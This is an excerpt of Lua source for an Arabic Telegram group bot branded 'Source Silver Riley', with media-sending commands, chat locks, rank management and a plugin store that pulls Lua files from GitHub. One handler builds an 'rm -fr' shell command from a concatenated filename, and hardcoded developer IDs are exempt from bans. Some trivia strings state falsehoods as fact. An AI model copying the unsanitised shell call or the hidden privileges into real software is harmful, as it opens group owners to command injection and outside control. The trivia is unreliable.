ght = math.random(1,7); 
local Text ='تم اختيار تصميم من تصميمات سيلفر رايلي هذه لك' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽𝐑𝐈𝐋𝐄𝐘 𖠢₎ •𖣘 ❩', url="t.me/Ahmed_Riley"}},
{{text = '《𝚂𝙴𝙼 SourceRiley》',url="t.me/SourceRiley"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SEMVIKING/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "غنيلي بفيديو" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(5,41); 
...
ght = math.random(1,570); 
local Text = 'تـم اخـتيار هـذه الـصوره لـك'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = ' ❨𖣘• ⁽??𝐈𝐋𝐄𝐘 𖠢₎ •𖣘',url="t.me/Ahmed_Riley"}},
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼',url="t.me/SourceRiley"}},
} 
local msg_id = msg.id_/2097152/0.5 
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس سيلفر رايلي؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس سيلفر رايلي؟ ", 
"كم مره حبيت؟ ", 
...
if text == 'الاخبار'  then
local Text = [[
 اكتب الاخبار ليتم عرض مواقع الاخبار.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المصري اليوم' ,url="https://www.almasryalyoum.com/"},{text = 'الوطن', url="https://m.elwatannews.com/"}},
{{text = 'الاهرام',url="https://www.ahram.org.eg/"}},
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼',url="t.me/SourceRiley"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/U_AFLAM/39&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == "صور رعب" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='اليك ما طلبت عزيزي استمتع . . .🥺√' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ', url="t.me/SourceRiley"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/rab_spnosh/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "افلام رعب" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(4,50); 
local Text ='اكتب افلام رعب وسوف يجلب لك البوت مقطع  مرئي' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ', url="t.me/SourceRiley"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/hhggsyv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "بروفيل" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='هاا واي كمان؟ 🌚🐍' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
...
if text == "صراحه بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='مرحبا إليك صراحه بالصور 🥴🤸' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ', url="t.me/SourceRiley"}},
} 
...
if text == "نكته بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,24); 
local Text ='مرحبا اليك نكته بالصور 🥺😹' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/VVV4Fh/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == "افلام كرتون" then  
ght = math.random(1,33);  
local Text ='اليك حلقه من كرتون عشوائي'  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'اضف البوت الي مجموعتك ✰  ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}  
...
if text == "كرتون" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='اكتب كرتون واستمتع بجمد الصور' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/karton5124/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "اسكرينات" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,64); 
local Text ='اكتب اسكرينات واستمتع باجمد الصور . .🙂❤️' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = ' ❨𖣘• ⁽𝘿𝙀𝙑 𝐑𝐈𝐋𝐄𝐘₎ •𖣘❩',url="t.me/Ahmed_Riley"}},
} 
...
if text == "قصص رعب" or text == "قصص مرعبه" then 
local TWEET_Msg = { 
"كلوديا غيلارد- مستذئبة مدينة برغندي: يُحكى بشهادة بعض الأشخاص، أن غيلارد كانت تجوب الغابات وهي تتظاهر بأنها ذئب بلا ذيل كي تتصيد فرائسها في الغابات، وتم الحكم عليها بالإعدام حرقاً ",
...
"الرقبه ليس البقعه المفضله فانت في عالم مصاص الدماء الحقيقي لا تترك ضحيتك ",
"فيَ الحقيَقه مصاص الدماء موجود لكن هناك اختلافات بينه وبين السينما ",
" فهو ان كان يشرب الدماء فهو لايحصل عليها عن طريق عض الضحايا من رقبتهم ",
" يُمكنك أن تَموت مِن الخَوف لأنّ الجِسم يُطلق كَمية كَبيرة مِن الأدرينالين التّي يُمكن أن تَكون سَامة عِندما تَكون بِكميات كَبيرة ",
"عِندما تَكون البَطارية على وشكِ النَفاذ لا تُجِب على الإتِصالات لأن الإشعَاعات حِينها تَكون مُضاعفة ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
...
if text == "اسلاميات" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(23,42); 
local Text ='اكتب اسلاميات وسوف يجلب لك البوت فيديو🙂❤️' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/koran5124/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼' then
local Text = [[ 
 🌏من أحسن السورسات على التليجرام سورس سيلفر رايلي 🌏
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾??𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁??𝙴 SourceRiley](http://t.me/SourceRiley)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ', url="t.me/SourceRiley"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SourceRiley/107/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘' then
local Text = [[ 
 🌏من أحسن السورسات على التليجرام سورس سيلفر رايلي 🌏
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[❨ رايلي مبرمج سورس سيلفر رايلي للتواصل معه اتبع الزر الاسفل ⬇️💕. ❩](t.me/Ahmed_Riley)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽𝐑𝐈𝐋𝐄𝐘 𖠢₎ •𖣘 ❩', url="t.me/Ahmed_Riley"}},
...
🌏 روايات ← لعرض الميزه
🌏 ثيم ← لعرض الميزه
🌏 رامزيات ولاد← لعرض الميزه
🌏 رامزيات بنات← لعرض الميزه
🌏 رامزيات كابلز← لعرض الميزه
🌏 صور انيمي← لعرض الميزه
🌏 تصميمات فايكنيج← لعرض الميزه
🌏 غنيلي بفيديو← لعرض الميزه
🌏 همسه ← لعرض الميزه
🌏 معني + اسمك ← لعرض الميزه
🌏 خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
🌏 𝘾𝙃 - [˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼](t.me/SourceRiley) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽𝐑𝐈𝐋𝐄𝐘 𖠢₎ •𖣘 ❩', url="t.me/Ahmed_Riley"}},
{{text = '❨  𖣘• ⁽SourceRiley₎ •𖣘 ❩', url="t.me/SourceRiley"}},
{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_AD_26/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'العاب سيلفر رايلي' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 🌏 اهلا في قائمه الالعاب المتطوره سورس سيلفر رايلي 🌏 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/SourceRiley)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🌏 تم تعطيل جلب الصوره ،\n 🌏 تم قفل البوتات  ،\n 🌏 تم قفل التكرار ،\n 🌏 تم قفل الروابط ،\n 🌏 تم قفل التوجيه ،\n 🌏 تم قفل الملصقات ،\n 🌏 تم قفل المتحركه ،\n 🌏 تم قفل الفيديو ،\n 🌏 تم قفل الفشار ،\n 🌏 تم قفل الانلاين ،\n 🌏 تم قفل تعديل المديا ،\n 🌏 تم وضع التكرار  ،\n 🌏 تم قفل الفارسيه  ،\n 🌏 تم وضع الايدي بدون صوره ،n  \n 🌏 تم تفعيل الحمايه  بواسطه ، [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'SourceRiley')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  تم تعطيل الحمايه القصوه من قبل    [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'SourceRiley')..')  ')
end,nil)   
end
if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 🌏  مـن قبـل  ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'SourceRiley')..') \n 🌏 تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🌏  مـن قبـل  ⇇['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SourceRiley')..') \n 🌏 تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1878891780) then  
send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1589498513) then  
send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1965588568) then  
...
if tonumber(result.sender_user_id_) == tonumber(1419690087) then  
...
if result.id_ == tonumber(1878891780) then
send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1589498513) then
send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر صاحب السورس \n")
return false 
end
if result.id_ == tonumber(1965588568) then
send(msg.chat_id_, msg.id_, "  لا يمكنك حظر صاحب التليجرام \n")
return false 
end
if result.id_ == tonumber(1443455396) then
...
if tonumber(userid) == tonumber(1878891780) then  
send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1589498513) then  
send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب السورس عام")
return false 
end
if tonumber(userid) == tonumber(1965588568) then  
send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب التليجرام عام")
return false 
end
if tonumber(userid) == tonumber(1443455396) then  
send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مالك السورس عام")
return false 
end
...
t = ' 🌏 ملفات السورس سيلفر رايلي𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅🌏𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SourceRiley/SourceRiley2/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n 🌏 اهلا بك في متجر ملفات سيلفر رايلي\n 🌏 ملفات السورس 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n◤━───━🌏𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 ??𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n 🌏 علامة تعني { ✔️ } ملف مفعل\n 🌏 علامة تعني { ✖ } ملف معطل\n 🌏 قناة سورس سيلفر رايلي𖣘━┅┄⟞⟦𝚂𝙾𝚄🌏𝙲𝙴 SourceRiley⟧⟝┄┉━𖣘\n".." 🌏 [اضغط هنا لدخول](t.me/SourceRiley) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/SourceRiley/SourceRiley2/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," 🌏 عذرا الملف لايدعم سورس سيلفر رايلي\n") 
end
return false
end
...
if text == ("مسح قائمه سيلفر رايلي") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 🌏 تم مسح قائمه سيلفر رايلي')
return false
end

if text == 'قائمه سيلفر رايلي' and Sudo(msg) then
...
if #list == 0 then
t = " 🌏 لا يوجد احد في قائمه سيلفر رايلي"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع سيلفر رايلي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local SourceRiley = database:get(bot_id..'text:ch:user')
if SourceRiley then
send(msg.chat_id_, msg.id_,'['..SourceRiley..']')
...
if text and text:match("^رفع سيلفر رايلي@(.*)$") and Sudo(msg) then
local username = text:match("^رفع سيلفر رايلي@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local SourceRiley = database:get(bot_id..'text:ch:user')
if SourceRiley then
send(msg.chat_id_, msg.id_,'['..SourceRiley..']')
...
if text and text:match("^رفع سيلفر رايلي(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع سيلفر رايلي(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local SourceRiley = database:get(bot_id..'text:ch:user')
if SourceRiley then
send(msg.chat_id_, msg.id_,'['..SourceRiley..']')
...
if text == ("تنزيل سيلفر رايلي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local SourceRiley = database:get(bot_id..'text:ch:user')
if SourceRiley then
send(msg.chat_id_, msg.id_,'['..SourceRiley..']')
...
if text and text:match("^تنزيل سيلفر رايلي@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل سيلفر رايلي@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local SourceRiley = database:get(bot_id..'text:ch:user')
if SourceRiley then
send(msg.chat_id_, msg.id_,'['..SourceRiley..']')
...
if text and text:match("^تنزيل سيلفر رايلي(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل سيلفر رايلي(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local SourceRiley = database:get(bot_id..'text:ch:user')
if SourceRiley then
send(msg.chat_id_, msg.id_,'['..SourceRiley..']')
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 🌏 لعضو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'SourceRiley')..')'
status  = '\n 🌏 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 🌏 الـعـضو   ⇇'..userid..''
...
t = "\n 🌏 قائمه زوجات الجروب \n 🌏═───═❲[˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ](t.me/SourceRiley)❳═───═🌏\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🌏 العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'SourceRiley')..')'
...
' }\nء⧬━┅┅┄⟞❲[𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗](t.me/SourceRiley)❳⟝┄┉┉━⧬'..
'\n 🌏  علامة ال {✓} تعني مفعل'..
'\n 🌏  علامة ال {✘} تعني معطل'..
'\nء𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘'..
'\n'..' 🌏  امر صيح  ⇇{ '..kickme..
...
' }\n'..' 🌏  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' 🌏  الرفع  ⇇{ '..setadd..
' }\n'..' 🌏  الحظر  ⇇{ '..banm..' }\n\n 🌏═───═❲[˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ](t.me/SourceRiley)❳═───═ 🌏\n 🌏 قناة سورس سيلفر رايلي𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\n [ ❲[˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ](t.me/SourceRiley)❳](t.me/SourceRiley) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘\nاضغط علي الاسم ليتم نسخه\n𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘ٴ\n 🌏 ❲[˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ](t.me/SourceRiley)❳ 🌏 ')
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 🌏 الـعـضو   ⇇['..result.title_..'](t.me/'..(text1[3] or 'SourceRiley')..')'..'\n 🌏 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'سيلفر رايلي').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'سيلفر رايلي')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  منصب علي سورس سيلفر رايلي🙈❤️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
'اسمي  '..Namebot..' يوتكه🙈🍑',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس سيلفر رايليو🙈♥️',
} 
Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
...
if text == "استوري رايلي" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(10,70); 
local Text ='تم اختيار لك استوري رايلي 🙂💔✌√' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽𝐑𝐈𝐋𝐄𝐘 𖠢₎ •𖣘 ❩', url="t.me/Ahmed_Riley"}},
{{text = '˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼',url="t.me/SourceRiley"}},
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/SourceRiley/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ثيم" then  
ght = math.random(1,33);  
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/55/&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SourceRiley/53/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/39/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'عاش' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/27/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'اجري' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/30/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'لا' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/34/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الو' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/41/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'حبك' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/13/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'سيلفر رايلي غني' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/72/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'قمر' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
